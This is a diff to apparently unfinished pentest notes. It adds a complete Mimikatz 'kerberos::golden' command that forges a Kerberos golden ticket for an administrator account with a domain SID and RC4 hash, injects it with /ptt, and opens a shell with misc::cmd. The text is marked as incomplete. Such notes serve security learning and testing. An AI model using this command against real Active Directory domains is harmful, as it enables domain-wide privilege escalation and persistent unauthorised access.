@@ -39,8 +39,16 @@ Use it:
 
 ## With Mimikatz from Windows
 
+NOT COMPLETED, must be tried again
+
 Open Mimikatz and fire the commands:
 
-Create a golden ticket and save it to a file in current directory:
+* `/ptt` inject it in current session. See it with `kerberos::list`
+
+```
+kerberos::golden /domain:contoso.local /sid:S-1-5-21-3782747949-3751736470-937249271 /rc4:8846f7eaee8fb117ad06bdd830b7586c /user:adm-jdupond /id:500 /ptt
+
+misc::cmd
+```
 
 **To be completed.**
